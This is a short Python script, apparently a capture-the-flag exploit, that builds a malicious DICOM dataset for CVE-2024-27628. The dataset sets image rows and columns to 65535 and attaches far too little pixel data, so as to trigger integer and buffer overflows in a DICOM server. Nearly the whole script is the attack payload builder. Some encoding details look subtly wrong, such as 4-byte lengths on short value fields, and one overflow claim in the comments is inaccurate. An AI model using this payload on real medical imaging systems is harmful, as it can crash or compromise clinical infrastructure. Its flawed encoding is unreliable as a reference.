import struct

'''
Exploit sent via DICOM P-DATA-TF
Flag retrieved via DICOM C-FIND

Expected pixels: 65535 * 65535 = 4294836225 (overflows 32-bit int)
Actual allocated buffer size: (rows*cols) * 2 (bytes/pixel) 
 = 8,589,672,450 bytes (but malloc may truncate)
'''

def create_cve_2024_27628_dataset():
    """Triggers integer overflow + buffer overflow"""
    # Values to overflow rows*cols (Uint16 multiplication)
    rows = 65535  # Max Uint16
    cols = 65535  # Max Uint16
    
    # Craft malicious dataset
    dataset = b""
    
    # (0028,0010) Rows
    dataset += struct.pack('<HHHHI', 0x0028, 0x0010, 0x5553, 0, 2)  # US
    dataset += struct.pack('<H', rows)
    
    # (0028,0011) Columns
    dataset += struct.pack('<HHHHI', 0x0028, 0x0011, 0x5553, 0, 2)  # US
    dataset += struct.pack('<H', cols)
    
    # (7FE0,0010) Pixel Data (undersized)
    pixel_data = b"A" * 1000  # Much smaller than expected 8.5GB
    dataset += struct.pack('<HHHHI', 0x7FE0, 0x0010, 0x4F57, 0, len(pixel_data))
    dataset += pixel_data
    
    return dataset